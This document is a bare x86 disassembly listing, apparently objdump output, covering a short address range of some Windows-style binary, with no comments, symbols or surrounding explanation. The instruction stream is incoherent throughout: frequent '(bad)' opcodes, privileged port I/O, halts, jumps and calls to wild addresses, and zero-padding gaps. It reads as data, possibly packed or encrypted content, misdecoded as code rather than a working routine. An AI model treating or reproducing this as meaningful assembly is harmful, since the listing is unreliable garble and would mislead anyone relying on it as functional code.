  4058d7:	add    BYTE PTR [ecx-0x7747fa62],cl
  4058dd:	or     DWORD PTR [eax],eax
  4058df:	add    bl,dl
  4058e1:	jg     0x4058a2
  4058e3:	je     0x405875
  4058e5:	aaa    
  4058e6:	push   DWORD PTR [ebp-0x6f]
  4058e9:	mov    eax,ds:0x830efe96
  4058ee:	call   0xffc378c4
  4058f3:	(bad)  
  4058f4:	aam    0x47
  4058f6:	(bad)  
  4058f7:	jmp    FWORD PTR [esi+0x6db5ff39]
  4058fd:	cmp    edi,0xffffffff
  405900:	mov    eax,ds:0x5900a03a
  405905:	cld    
  405906:	mov    edi,0xfe79d40f
  40590b:	dec    DWORD PTR [esi]
  40590d:	xor    DWORD PTR [ebp-0x7cf044],0xffffffe8
  405914:	lock pop ecx
  405916:	arpl   WORD PTR [eax],ax
  405918:	lock or al,0x4e
  40591b:	mov    eax,0xe8840416
  405920:	push   ecx
  405921:	sub    eax,0x3139ff84
  405926:	idiv   edi
  405928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405929:	call   0x636cdcc4
  40592e:	dec    ebx
  40592f:	inc    ebp
  405930:	in     al,dx
  405931:	outs   dx,BYTE PTR ds:[esi]
  405932:	add    eax,DWORD PTR [eax]
  405934:	lock push esp
  405936:	stc    
  405937:	or     ecx,eax
  405939:	mov    ch,0x56
  40593b:	inc    DWORD PTR [eax]
	...
  40594d:	add    bh,dl
  40594f:	jns    0x405994
  405951:	je     0x40593d
  405953:	test   al,0xfb
  405956:	(bad)  
  405957:	cmp    edx,DWORD PTR [edi+edi*8]
  40595a:	inc    ebp
  40595b:	stos   BYTE PTR es:[edi],al
  40595c:	ins    BYTE PTR es:[edi],dx
  40595d:	adc    eax,0x5083a5a2
  405962:	scas   eax,DWORD PTR es:[edi]
  405963:	adc    eax,DWORD PTR [eax-0x7c5bea18]
  405969:	jmp    FWORD PTR [edi+0x23]
  40596c:	sub    BYTE PTR [edx-0xf],0x84
  405970:	stc    
  405971:	sti    
  405972:	(bad)  
  405973:	jae    0x405980
  405975:	call   0xffc34d36
  40597a:	jg     0x4059ef
  40597c:	jg     0x405966
  40597e:	sbb    eax,0x39ff8334
  405983:	xor    BYTE PTR [eax],dl
  405985:	add    BYTE PTR [ebp+0x34816fe8],bh
  40598b:	fiadd  WORD PTR [ecx+0x35857ff]
  405991:	push   0xfffffff3
  405993:	cmp    al,0xf9
  405995:	pop    es
  405996:	pop    eax
  405997:	mov    edx,0xe73fff4e
  40599c:	enter  0xc8fb,0x6
  4059a0:	in     eax,dx
  4059a1:	add    al,0xf0
  4059a3:	push   es
  4059a4:	ins    BYTE PTR es:[edi],dx
  4059a5:	mov    DWORD PTR [edi],ebx
  4059a7:	jge    0x4059bf
  4059a9:	add    eax,0x6e
  4059ac:	xor    eax,0xf206f0a3
  4059b1:	inc    ebx
	...
  4059c2:	add    BYTE PTR [eax],al
  4059c4:	inc    DWORD PTR [edx+0x6f0044a]
  4059ca:	mov    ah,0x7
  4059cc:	icebp  
  4059cd:	push   es
  4059ce:	jmp    0xe9dfc8e5
  4059d3:	add    esi,eax
  4059d5:	out    dx,al
  4059d6:	mov    al,0x33
  4059d8:	xor    DWORD PTR [edi],eax
  4059da:	fs mov bh,ah
  4059dd:	jl     0x4059ad
  4059df:	add    BYTE PTR [eax+0x6f],0x8a
  4059e3:	push   esp
  4059e4:	iret   
  4059e5:	jnp    0x405a57
  4059e7:	mov    al,al
  4059e9:	jl     0x4059a1
  4059eb:	cmp    BYTE PTR [edi-0x487e464f],0x7b
  4059f2:	adc    DWORD PTR [eax],ecx
  4059f4:	icebp  
  4059f5:	push   es
  4059f6:	jmp    0x97b3c78b
  4059fb:	sbb    BYTE PTR [edi-0x379bff2a],0xc5
  405a02:	call   0x287706f2
  405a07:	add    al,0x18
  405a09:	push   ebp
  405a0a:	mov    ecx,0x63637fc4
  405a0f:	mov    ds:0x43f206f0,al
  405a14:	in     al,0x15
  405a16:	rol    DWORD PTR [ebx],cl
  405a18:	jne    0x40599b
  405a1a:	pop    esi
  405a1b:	sbb    DWORD PTR [edi+0x7b],0xedd82b9
  405a22:	push   ecx
  405a23:	popf   
  405a24:	dec    ebp
  405a25:	jnp    0x405a65
  405a27:	add    BYTE PTR [eax],0x0
	...
  405a3a:	jge    0x405ab2
  405a3c:	add    BYTE PTR [edi],dh
  405a3e:	jb     0x405abb
  405a40:	push   0x6ece5
  405a45:	je     0x405abf
  405a47:	jae    0x405a47
  405a49:	push   ds
  405a4a:	jb     0x405a22
  405a4c:	addr16 or ebx,ecx
  405a4f:	(bad)  
  405a52:	mov    WORD PTR [esi],?
  405a54:	inc    ecx
  405a55:	jmp    0xa870ab75
  405a5a:	rep outs dx,BYTE PTR ds:[esi]
  405a5c:	dec    edi
  405a5d:	push   esi
  405a5e:	repz push es
  405a60:	or     ebp,DWORD PTR [ecx]
  405a62:	call   DWORD PTR ds:0x847ee96a
  405a68:	neg    edi
  405a6a:	jno    0x405ae6
  405a6c:	push   eax
  405a6d:	(bad)  
  405a6e:	out    0x2,eax
  405a70:	call   0xffbab1a3
  405a75:	mov    BYTE PTR [edi+0x71befe77],0x6f
  405a7c:	jge    0x405a22
  405a7e:	jno    0x405afa
  405a80:	push   0x2
  405a82:	inc    esp
  405a83:	inc    esp
  405a84:	shl    DWORD PTR [esi+0x15c00e71],1
  405a8a:	shr    dh,1
  405a8c:	mov    dh,0xd9
  405a8e:	mov    dl,0x7a
  405a90:	dec    edi
  405a91:	xor    DWORD PTR [esi-0x5b7900a9],0x7118fff0
  405a9b:	hlt    
  405a9c:	pop    es
  405a9d:	add    DWORD PTR [eax],0x0
	...
  405aaf:	add    dh,al
  405ab1:	jnp    0x405ab2
  405ab3:	outs   dx,BYTE PTR ds:[esi]
  405ab4:	add    al,0xd1
  405ab6:	int3   
  405ab7:	data16 jno 0x405aa9
  405aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405abb:	sbb    DWORD PTR [ebx],esi
  405abd:	jp     0x405b28
  405abf:	repz jo 0x405ab6
  405ac2:	pop    es
  405ac3:	inc    ecx
  405ac4:	xchg   BYTE PTR [ecx-0x1],bh
  405ac7:	add    BYTE PTR [esi-0x67cf5a96],dh
  405acd:	push   es
  405ace:	push   0x23
  405ad0:	push   es
  405ad1:	jb     0x405ada
  405ad3:	call   0x3fdf7a
  405ad8:	xor    DWORD PTR [eax+0x6c194130],0xe7cff1b
  405ae2:	call   0xffc84273
  405ae7:	dec    DWORD PTR [ecx+edi*8-0x11fe8a02]
  405aee:	fwait
  405aef:	retf   0x8706
  405af2:	leave  
  405af3:	ret    0x60d
  405af6:	push   ebp
  405af7:	mov    eax,ebp
  405af9:	ins    DWORD PTR es:[edi],dx
  405afa:	(bad)  
  405afb:	push   DWORD PTR [esi-0x2a8a00b9]
  405b01:	xchg   BYTE PTR [ebp+0x8],dh
  405b04:	mov    cl,0xf4
  405b06:	in     eax,dx
  405b07:	push   DWORD PTR [esi-0x26f73e34]
  405b0d:	push   eax
  405b0e:	mov    ch,ah
  405b10:	dec    edx
  405b11:	ret    0xc7f7
	...
  405b24:	add    BYTE PTR [eax],al
  405b26:	or     al,0x87
  405b28:	add    BYTE PTR [eax],al
  405b2a:	cdq    
  405b2b:	add    eax,0x5585458d
  405b30:	addr16 lock mov ecx,0xfcfeff44
  405b37:	push   ss
  405b38:	push   DWORD PTR ds:0x412de4
  405b3e:	popa   
  405b3f:	dec    dh
  405b41:	inc    DWORD PTR [esi]
  405b43:	or     eax,eax
  405b45:	je     0x405aee
  405b47:	mov    WORD PTR [ebp-0x8],es
  405b4a:	inc    ecx
  405b4b:	add    al,0x0
  405b4d:	out    dx,eax
  405b4e:	xchg   DWORD PTR [esi-0x2f0f038b],eax
  405b54:	cmc    
  405b55:	not    DWORD PTR [edi+0x52]
  405b58:	or     ebp,eax
  405b5a:	stos   BYTE PTR es:[edi],al
  405b5b:	sar    DWORD PTR [edi-0x1],1
  405b5e:	inc    edi
  405b5f:	mov    dl,0x7b
  405b61:	call   0xffc07ee3
  405b66:	sub    DWORD PTR ds:0xf4c5000b,ebp
  405b6c:	outs   dx,BYTE PTR ds:[esi]
  405b6d:	sub    DWORD PTR [ebx+edx*8],0x281fff80
  405b74:	xchg   BYTE PTR [eax+0x800816],bh
  405b7a:	lock outs dx,DWORD PTR ds:[esi]
  405b7c:	add    ecx,DWORD PTR [ebx-0x3ff39453]
  405b82:	test   BYTE PTR [edx-0x7d],ch
  405b85:	cmp    al,dh
  405b87:	repnz add eax,0xe9
	...
  405b99:	add    BYTE PTR [eax],al
  405b9b:	add    ah,dh
  405b9d:	outs   dx,BYTE PTR ds:[esi]
  405b9e:	add    eax,DWORD PTR [eax]
  405ba0:	out    0xd3,eax
  405ba2:	adc    edi,edi
  405ba4:	bound  ebp,QWORD PTR gs:[ebx+0x29]
  405ba8:	ror    BYTE PTR [ecx+0x7f],0x50
  405bac:	and    BYTE PTR [ecx-0x7],al
  405baf:	pop    es
  405bb0:	fadd   st,st(0)
  405bb2:	jle    0x405bb3
  405bb4:	mov    edi,0xb7cbfb46
  405bb9:	test   eax,0x2edcceec
  405bbe:	add    al,0xff
  405bc0:	sbb    eax,0xc00d6b6a
  405bc5:	xchg   ecx,eax
  405bc6:	jg     0x405b51
  405bc8:	ins    DWORD PTR es:[edi],dx
  405bc9:	(bad)  
  405bca:	jge    0x405bcb
  405bcc:	(bad)  
  405bcd:	push   ss
  405bce:	ds add eax,esi
  405bd1:	ins    DWORD PTR es:[edi],dx
  405bd2:	nop
  405bd3:	test   DWORD PTR [edx+0x20ff7ef0],esi
  405bd9:	xchg   BYTE PTR [ecx+0x66076fcc],cl
  405bdf:	xchg   ecx,eax
  405be0:	ins    DWORD PTR es:[edi],dx
  405be1:	inc    ebp
  405be2:	pop    edi
  405be3:	jg     0x405c44
  405be5:	xlat   BYTE PTR ds:[ebx]
  405be6:	push   ebp
  405be7:	mov    ecx,0x7f4e7998
  405bec:	pop    eax
  405bed:	inc    esi
  405bee:	fs add al,0xf0
  405bf1:	lea    esp,[eax+eax*8+0x3e]
  405bf5:	js     0x405c2d
  405bf7:	(bad)  
  405bf8:	out    0x82,al
  405bfa:	xchg   BYTE PTR [eax+esi*8],al
  405bfd:	push   es
  405bfe:	je     0x405b99
	...
  405c10:	add    BYTE PTR [eax],al
  405c12:	xor    bh,BYTE PTR [ecx+0x1e]
  405c15:	jg     0x405c3e
  405c17:	add    eax,0x6f003f9
  405c1c:	xchg   ebp,eax
  405c1d:	idiv   DWORD PTR [edx+edx*4+0x2b]
  405c21:	jle    0x405c2a
  405c23:	js     0x405c91
  405c25:	ret    0xd6cb
  405c28:	or     BYTE PTR [ecx-0x3c],0xc5
  405c2c:	call   0xe9d9e49c
  405c31:	add    edi,ebx
  405c33:	inc    esi
  405c34:	push   esp
  405c35:	add    cl,bl
  405c37:	fsub   QWORD PTR [ebx-0x68]
  405c3a:	mov    dl,0x78
  405c3c:	into   
  405c3d:	jle    0x405cbc
  405c3f:	les    edx,FWORD PTR [esp+edx*8]
  405c42:	dec    edi
  405c43:	dec    ebx
  405c44:	or     eax,0x375fbfc5
  405c49:	mov    eax,ds:0x43e206f0
  405c4e:	and    eax,0x74c39205
  405c53:	xchg   ecx,eax
  405c54:	stos   DWORD PTR es:[edi],eax
  405c55:	jge    0x405bf6
  405c57:	ja     0x405cbd
  405c59:	ror    ebx,0x8d
  405c5c:	fs mov bh,0x8e
  405c5f:	ja     0x405be7
  405c61:	jmp    0x405c08
  405c63:	sub    BYTE PTR cs:[edi+edi*2],al
  405c67:	icebp  
  405c68:	jmp    esp
  405c6a:	or     edi,esi
  405c6c:	into   
  405c6d:	outs   dx,BYTE PTR ds:[esi]
  405c6e:	out    dx,al
  405c6f:	ja     0x405c26
  405c71:	popf   
  405c72:	in     eax,0x77
  405c74:	(bad)  
  405c75:	mov    ecx,0x0
	...
  405c86:	add    BYTE PTR [eax],al
  405c88:	retf   
  405c89:	inc    ebp
  405c8a:	iret   
  405c8b:	push   esi
  405c8c:	(bad)  
  405c8d:	ja     0x405d04
  405c8f:	stc    
  405c90:	and    ebx,DWORD PTR [edi-0x48]
  405c93:	ss (bad) 
  405c95:	ja     0x405ce7
  405c97:	cdq    
  405c98:	mov    esi,0x8c4107f1
  405c9d:	js     0x405c9e
  405c9f:	cs fwait
  405ca1:	mov    al,0xcb
  405ca3:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405ca5:	mov    DWORD PTR [ebp-0x8862d5],eax
  405cab:	mov    ecx,0xfbcb196
  405cb0:	mov    ?,WORD PTR [edi-0x18]
  405cb3:	aad    0x50
  405cb5:	push   es
  405cb6:	add    BYTE PTR [ebx+esi*4+0x7],ah
  405cba:	test   DWORD PTR [ebp-0x1100888a],ecx
  405cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cc1:	mov    bl,0xfe
  405cc3:	out    0x65,al
  405cc5:	pop    edi
  405cc6:	pop    ds
  405cc7:	jl     0x405cbd
  405cc9:	push   es
  405cca:	call   FWORD PTR [esp+edx*4+0x5cceff75]
  405cd1:	(bad)  
  405cd2:	retf   
  405cd3:	mov    BYTE PTR [ebp+0x40],0xc2
  405cd7:	in     eax,dx
  405cd8:	repz fisttp DWORD PTR [edx-0x3b48e3b]
  405cdf:	scas   al,BYTE PTR es:[edi]
  405ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce1:	add    ch,al
  405ce3:	stos   BYTE PTR es:[edi],al
  405ce4:	xor    eax,0xb770ff76
  405ce9:	jb     0x405cf6
  405ceb:	test   eax,0x0
	...
  405cfc:	add    BYTE PTR [eax],al
  405cfe:	in     eax,0x8a
  405d00:	mov    ecx,gs
  405d02:	repz push es
  405d04:	push   0x4138b700
  405d09:	add    dh,bh
  405d0b:	jge    0x405d08
  405d0d:	call   0x3f2214
  405d12:	or     DWORD PTR [ebx+0x76],esp
  405d15:	xor    bl,BYTE PTR [eax+0x44ff500a]
  405d1b:	add    ch,al
  405d1d:	xchg   esp,eax
  405d1e:	mov    edi,0x91e8fef3
  405d23:	mov    edi,0x2f21fffe
  405d28:	xor    al,BYTE PTR [ecx+0x49]
  405d2b:	repz je 0x405d2a
  405d2e:	mov    cl,0xd0
  405d30:	int    0xff
  405d32:	ficomp WORD PTR [edx+0x67]
  405d35:	ja     0x405d82
  405d37:	dec    ecx
  405d38:	dec    DWORD PTR [edi-0x2]
  405d3b:	jge    0x405d44
  405d3d:	call   0x3f51bc
  405d42:	icebp  
  405d43:	sub    ecx,ebx
  405d45:	(bad)  
  405d46:	out    dx,al
  405d47:	bound  edx,QWORD PTR [ebx+0x32]
  405d4a:	dec    eax
  405d4b:	or     bh,bh
  405d4d:	jne    0x405d4c
  405d4f:	loope  0x405d09
  405d51:	into   
  405d52:	fdivrp st(2),st
  405d54:	dec    edi
  405d55:	push   0x413946
  405d5a:	sbb    esp,esi
  405d5c:	je     0x405d66
  405d5e:	mov    cl,0x57
  405d60:	std    
  405d61:	inc    DWORD PTR [eax]
	...
  405d73:	add    BYTE PTR [esi-0x5134fa1f],bh
  405d79:	repnz outs dx,BYTE PTR ds:[si]
  405d7c:	mov    ebx,0xf4feff48
  405d81:	xchg   al,ch
  405d83:	cwde   
  405d84:	(bad)  
  405d85:	repnz (bad) 
  405d87:	push   eax
  405d88:	add    DWORD PTR [ecx+esi*1+0x41],edi
  405d8c:	mov    DWORD PTR [ecx-0x2],ebx
  405d8f:	jne    0x405d81
  405d91:	imul   esi,DWORD PTR [bx+di],0xffffff8e
  405d95:	test   BYTE PTR [eax+ebp*8-0x73],bh
  405d99:	mov    ecx,0x7a7fff7c
  405d9e:	jg     0x405d88
  405da0:	xchg   ebp,eax
  405da1:	test   eax,0xa139ff7c
  405da6:	or     eax,DWORD PTR [eax]
  405da8:	mov    ebp,0x34836ef8
  405dad:	rcl    ebx,cl
  405daf:	imul   esi,eax,0xc5ff0749
  405db5:	addr16 imul edi,esi,0x2f
  405db9:	int3   
  405dba:	jnp    0x405d45
  405dbc:	mov    ch,0x33
  405dbe:	mov    BYTE PTR ds:0xffc3076e,bh
  405dc4:	scas   eax,DWORD PTR es:[edi]
  405dc5:	add    esi,DWORD PTR fs:[ebx+ebp*8-0x69]
  405dca:	imul   esi,DWORD PTR [eax],0xffffffb1
  405dcd:	pop    edi
  405dce:	aam    0xe7
  405dd0:	test   eax,0xfb0002fa
  405dd5:	pop    ds
  405dd6:	neg    DWORD PTR ds:0x0
	...
  405de8:	add    BYTE PTR [eax],al
  405dea:	lahf   
  405deb:	pop    ss
  405dec:	out    dx,eax
  405ded:	sar    edi,cl
  405def:	jae    0x405df8
  405df1:	sar    BYTE PTR [ebx+edx*2-0x2d],0x67
  405df6:	addr16 mov al,0xc2
  405df9:	push   DWORD PTR [edi]
  405dfb:	ins    DWORD PTR es:[edi],dx
  405dfc:	icebp  
  405dfd:	pop    es
  405dfe:	enter  0x79bd,0xff
  405e02:	xlat   BYTE PTR ds:[ebx]
  405e03:	inc    esi
  405e04:	(bad)
  405e08:	js     0x405e3d
  405e0a:	mov    al,0x87
  405e0c:	jnp    0x405e0d
  405e0e:	mov    edi,0xf8ae76b5
  405e13:	lock les ebx,FWORD PTR fs:[edx]
  405e17:	pop    eax
  405e18:	jp     0x405e8f
  405e1a:	clc    
  405e1b:	push   es
  405e1c:	xchg   ecx,eax
  405e1d:	jne    0x405dbd
  405e1f:	je     0x405dbf
  405e21:	out    dx,al
  405e22:	shl    BYTE PTR [ebx+0x1c],cl
  405e25:	or     al,0x98
  405e27:	ins    BYTE PTR es:[edi],dx
  405e28:	(bad)  
  405e29:	jnp    0x405db2
  405e2b:	loope  0x405e11
  405e2d:	jp     0x405e34
  405e2f:	call   DWORD PTR [eax+0x76747659]
  405e35:	out    dx,al
  405e36:	adc    eax,0x580bf474
  405e3b:	pop    eax
  405e3c:	addr16 jnp 0x405e9e
  405e3f:	fbld   TBYTE PTR [edx+0x34]
  405e42:	mov    cl,0x6
  405e44:	push   esi
  405e45:	icebp  
  405e46:	neg    DWORD PTR [esi-0x5c]
  405e49:	js     0x405e92
  405e4b:	je     0x405e1e
  405e4d:	sub    eax,DWORD PTR [eax]
	...
  405e5f:	add    BYTE PTR [ecx],al
  405e61:	(bad)  
  405e62:	call   0x413f1be1
  405e67:	cmp    al,0x2d
  405e69:	je     0x405e99
  405e6b:	in     al,dx
  405e6c:	lds    esi,FWORD PTR ds:0xfa1f03a8
  405e72:	lock imul ecx,ebx,0x71
  405e76:	push   ss
  405e77:	jnp    0x405e11
  405e79:	sbb    al,0xc4
  405e7c:	pop    es
  405e7d:	jne    0x405efb
  405e7f:	or     ecx,DWORD PTR [eax]
  405e81:	adc    eax,0xdef77afc
  405e86:	sub    dh,BYTE PTR ds:0xf0ee0731
  405e8c:	out    dx,eax
  405e8d:	pop    esi
  405e8e:	clc    
  405e8f:	js     0x405e70
  405e91:	jae    0x405ee4
  405e93:	je     0x405eb6
  405e95:	(bad)  
  405e96:	call   0xc13fa415
  405e9b:	inc    esp
  405e9d:	jae    0x405e65
  405e9f:	jp     0x405ee6
  405ea1:	jae    0x405e61
  405ea3:	lock out dx,eax
  405ea5:	pop    esi
  405ea6:	add    BYTE PTR [ebx],dh
  405ea8:	xor    esi,DWORD PTR [edi+edi*8+0xe]
  405eac:	xor    eax,0xc0e90449
  405eb1:	sub    ah,0x6a
  405eb4:	cwde   
  405eb5:	(bad)  
  405eb6:	call   FWORD PTR [edx+eiz*8]
  405eb9:	jae    0x405f30
  405ebb:	stc    
  405ebc:	or     bh,dl
  405ebe:	or     eax,DWORD PTR [esi-0x4c17f480]
	...
  405ed4:	add    BYTE PTR [eax],al
  405ed6:	push   es
  405ed7:	je     0x405ed8
  405ed9:	jbe    0x405f3b
  405edb:	jmp    edi
  405edd:	xchg   ecx,eax
  405ede:	mov    ah,0x73
  405ee0:	push   DWORD PTR [eax]
  405ee2:	mov    ch,0x2
  405ee4:	add    BYTE PTR [esi+eiz*2-0x38d27c9e],dh
  405eeb:	loopne 0x405eec
  405eed:	dec    ebp
  405eee:	inc    eax
  405eef:	pop    ss
  405ef0:	(bad)  
  405ef1:	mov    esp,0xed7573e3
  405ef6:	retf   
  405ef7:	pop    esp
  405ef8:	int3   
  405ef9:	ss stos BYTE PTR es:[edi],al
  405efb:	(bad)  
  405efc:	mov    edi,0x457e3fb5
  405f01:	and    eax,0xa8326b0b
  405f06:	repz jae 0x405f7e
  405f09:	adc    eax,0xeccbd9b
  405f0e:	mov    bl,dh
  405f10:	(bad)  
  405f11:	call   0xfe9113a0
  405f16:	pop    es
  405f17:	or     ebp,eax
  405f19:	dec    esp
  405f1a:	push   0x72
  405f1c:	inc    DWORD PTR [ecx-0x16becaa2]
  405f22:	pop    eax
  405f23:	cld    
  405f24:	sti    
  405f25:	ror    DWORD PTR [edx],1
  405f27:	inc    esp
  405f28:	call   esi
  405f2a:	fadd   QWORD PTR [edi]
  405f2c:	add    BYTE PTR [esi+0xfed78a],bh
  405f32:	cld    
  405f33:	add    ch,al
  405f35:	mov    dh,BYTE PTR [esi-0x10]
  405f38:	(bad)  
  405f39:	push   0x0
	...
  405f4a:	add    BYTE PTR [eax],al
  405f4c:	cmp    DWORD PTR [bx+di+0x0],eax
  405f50:	push   esi
  405f51:	(bad)  
  405f52:	sti    
  405f53:	call   0x3f28f2
  405f58:	add    DWORD PTR [ecx],ecx
  405f5a:	add    bh,ch
  405f5c:	daa    
  405f5d:	pop    ebx
  405f5e:	(bad)  
  405f5f:	jne    0x405ef2
  405f61:	fisubr WORD PTR [esi-0x1]
  405f64:	jbe    0x405f56
  405f66:	(bad)  
  405f67:	jne    0x405f5e
  405f69:	loop   0x405fc8
  405f6b:	leave  
  405f6c:	out    0xef,al
  405f6e:	enter  0x49c2,0x6
  405f72:	push   ebp
  405f73:	mov    eax,ebp
  405f75:	bound  ecx,QWORD PTR [edx]
  405f77:	xor    ecx,DWORD PTR [eax+0x5575ff06]
  405f7d:	fsubp  st(0),st
  405f7f:	int3   
  405f80:	mov    dh,0xef
  405f82:	(bad)  
  405f83:	jne    0x405f9e
  405f85:	push   esi
  405f86:	out    0x34,eax
  405f88:	add    al,0xf0
  405f8a:	(bad)  
  405f8b:	jmp    FWORD PTR [edx+eax*1+0x50]
  405f8f:	call   FWORD PTR [esi+edi*8-0x19]
  405f93:	ds (bad) 
  405f95:	out    dx,eax
  405f96:	(bad)  
  405f97:	push   0x413b1e
  405f9c:	out    0x61,al
  405f9e:	or     ebp,eax
  405fa0:	into   
  405fa1:	mov    esi,0x61f6fffe
  405fa6:	movmskps esp,xmm1
  405fa9:	sbb    ch,cl
  405fab:	jmp    esi
  405fad:	out    dx,al
  405fae:	je     0x405fc4
	...
  405fc0:	add    BYTE PTR [eax],al
  405fc2:	mov    esi,ebp
  405fc4:	je     0x405fce
  405fc6:	rcr    DWORD PTR [ecx],0xff
  405fc9:	push   DWORD PTR [esi-0xfef3e44]
  405fcf:	pop    edi
  405fd0:	into   
  405fd1:	mov    dl,ah
  405fd3:	fdivr  QWORD PTR [esi]
  405fd5:	cld    
  405fd6:	mov    edi,0x20e80832
  405fdb:	mov    ds:0x9ffbff78,eax
  405fe0:	out    dx,eax
  405fe1:	dec    ecx
  405fe2:	jns    0x40600e
  405fe4:	js     0x40604e
  405fe6:	lock pop edi
  405fe8:	push   0x359808be
  405fed:	inc    ecx
  405fee:	lock cwde 
  405ff0:	out    dx,al
  405ff1:	sti    
  405ff2:	xchg   DWORD PTR [edx],ebx
  405ff4:	or     al,0xe8
  405ff6:	imul   ecx,DWORD PTR [eax+0x5f08ff78],0x3
  405ffd:	out    dx,eax
  405ffe:	scas   al,BYTE PTR es:[edi]
  405fff:	pop    es
  406000:	jne    0x406034
  406002:	mov    cl,0x5f
  406004:	js     0x40607b
  406006:	pop    esp
  406007:	call   0x598867f9
  40600c:	js     0x40600d
  40600e:	dec    edi
  40600f:	inc    edi
  406010:	add    eax,0xeb815700
  406015:	std    
  406016:	add    bl,BYTE PTR [edi+0x33bdff03]
  40601c:	js     0x406093
  40601e:	clc    
  40601f:	(bad)  
  406020:	loope  0x406020
  406022:	daa    
  406023:	and    BYTE PTR [eax+0x75],bh
	...
  406036:	add    BYTE PTR [eax],al
  406038:	sbb    al,0x17
  40603a:	mov    ah,0xc8
  40603c:	pop    ss
  40603d:	adc    BYTE PTR [edx-0x3e],cl
  406040:	clc    
  406041:	pop    edi
  406042:	into   
  406043:	mov    dl,BYTE PTR [esp+ebx*8]
  406046:	ds cld 
  406048:	mov    bl,BYTE PTR [edi-0x13]
  40604b:	add    al,0xf7
  40604d:	stc    
  40604e:	or     ch,al
  406050:	lds    esp,FWORD PTR [ebx]
  406052:	js     0x406053
  406054:	jns    0x406001
  406056:	ja     0x4060c0
  406058:	cdq    
  406059:	pop    es
  40605a:	sbb    eax,ebp
  40605c:	xlat   BYTE PTR ds:[ebx]
  40605d:	call   0x77192bf
  406062:	(bad)  
  406063:	xor    DWORD PTR [ebp+0x1e],edx
  406066:	sub    BYTE PTR [edi+edi*4],al
  406069:	cli    
  40606a:	lock imul eax,DWORD PTR [esi+0x1877be71],0x3c
  406072:	sti    
  406073:	les    esp,FWORD PTR [edi+0x313259e8]
  406079:	pop    es
  40607a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40607b:	xor    DWORD PTR ds:0x8f04281e,eax
  406081:	cli    
  406082:	loopne 0x4060ef
  406084:	pop    esi
  406085:	jno    0x406015
  406087:	ja     0x406091
  406089:	push   edi
  40608a:	mov    ebx,0xfde877c4
  40608f:	xor    DWORD PTR [ecx-0x2ace89fa],esi
  406095:	sbb    eax,0xfa5f0428
  40609a:	lock imul eax,DWORD PTR [eax],0x0
	...
  4060ae:	(bad)  
  4060af:	jo     0x40610f
  4060b1:	ja     0x40608b
  4060b3:	push   ecx
  4060b4:	sbb    eax,ebp
  4060b6:	inc    edi
  4060b7:	call   0x6f19289
  4060bc:	inc    esi
  4060bd:	xor    ebp,eax
  4060bf:	sbb    eax,0xfa2f03a8
  4060c4:	loopne 0x406131
  4060c6:	mov    ?,WORD PTR [eax+0x2e]
  4060c9:	ja     0x406053
  4060cb:	lods   eax,DWORD PTR ds:[esi]
  4060cc:	fcmovnb st,st(4)
  4060ce:	pop    ss
  4060cf:	call   0x6f19317
  4060d4:	push   ss
  4060d5:	xor    DWORD PTR [ebp-0xfc57e3],edx
  4060db:	stc    
  4060dc:	lock imul esp,DWORD PTR [esi+0x5876fe70],0x3c
  4060e4:	add    BYTE PTR [ebx+0x44676fac],bh
  4060ea:	and    al,dh
  4060ec:	jmp    ebp
  4060ee:	and    dl,ah
  4060f0:	sub    BYTE PTR [eax],ch
  4060f2:	hlt    
  4060f3:	outs   dx,DWORD PTR ds:[esi]
  4060f4:	jne    0x4060d7
  4060f6:	pop    ebx
  4060f7:	cmp    esi,edi
  4060f9:	into   
  4060fa:	inc    esi
  4060fb:	(bad)  
  4060fd:	sti    
  4060fe:	lods   al,BYTE PTR ds:[esi]
  4060ff:	outs   dx,DWORD PTR ds:[esi]
  406100:	addr16 test cl,ah
  406103:	(bad)  
  406106:	loopne 0x4060e9
  406108:	sub    BYTE PTR [eax],ch
  40610a:	hlt    
  40610b:	outs   dx,DWORD PTR ds:[esi]
  40610c:	jne    0x4060ff
  40610e:	or     edx,DWORD PTR [ecx]
  406110:	(bad)  
  406111:	sahf   
	...
  406122:	add    BYTE PTR [eax],al
  406124:	push   es
  406125:	(bad)  
  406127:	fld    TBYTE PTR [edi+ebp*2-0x3a3ebb99]
  40612e:	inc    DWORD PTR [ebp+0x2828e1c0]
  406134:	hlt    
  406135:	outs   dx,DWORD PTR ds:[esi]
  406136:	jne    0x406119
  406138:	fisttp DWORD PTR [eax]
  40613a:	(bad)  
  40613b:	outs   dx,BYTE PTR ds:[esi]
  40613c:	out    0xde,al
  40613e:	mov    eax,0x676f2d1b
  406143:	fiadd  WORD PTR [ecx]
  406145:	(bad)  
  406146:	inc    eax
  406148:	icebp  
  406149:	push   es
  40614a:	add    BYTE PTR [ecx-0x3a],ch
  40614d:	stc    
  40614e:	pop    es
  40614f:	push   ecx
  406150:	into   
  406151:	jno    0x406152
  406153:	sbb    edi,DWORD PTR ds:[edx+esi*1]
  406157:	test   al,0xf3
  406159:	ficom  WORD PTR [edx+0x676f34fb]
  40615f:	jmp    0x406154
  406161:	push   es
  406162:	sbb    BYTE PTR [esi],0x0
  406165:	pop    es
  406166:	call   0xffafe99c
  40616b:	and    DWORD PTR [ebx+0x9004134],0x98327e5b
  406175:	or     ch,BYTE PTR [eax+0x2]
  406178:	(bad)  [edx]
  40617a:	cmp    bh,0x64
  40617d:	add    ch,al
  40617f:	ror    esp,0xf4
  406182:	(bad)  
  406183:	push   0x41398c
	...
  406198:	add    BYTE PTR [eax],al
  40619a:	xor    DWORD PTR [ecx+esi*1+0x41],esi
  40619e:	leave  
  40619f:	bound  eax,QWORD PTR [ecx]
  4061a1:	add    cl,cl
  4061a3:	mov    bh,bh
  4061a5:	jne    0x406148
  4061a7:	loop   0x406152
  4061a9:	std    
  4061aa:	pop    esi
  4061ab:	hlt    
  4061ac:	addr16 mov ecx,0x67ff499b
  4061b2:	and    al,0x39
  4061b4:	inc    ecx
  4061b5:	add    cl,ah
  4061b7:	or     BYTE PTR [eax],al
  4061b9:	add    BYTE PTR [ecx],bl
  4061bb:	hlt    
  4061bc:	je     0x4061c6
  4061be:	jno    0x406158
  4061c0:	std    
  4061c1:	jmp    FWORD PTR [esi+0x5b]
  4061c4:	retf   0x1832
  4061c7:	add    ebp,DWORD PTR [eax-0x5b]
  4061ca:	stos   DWORD PTR es:[edi],eax
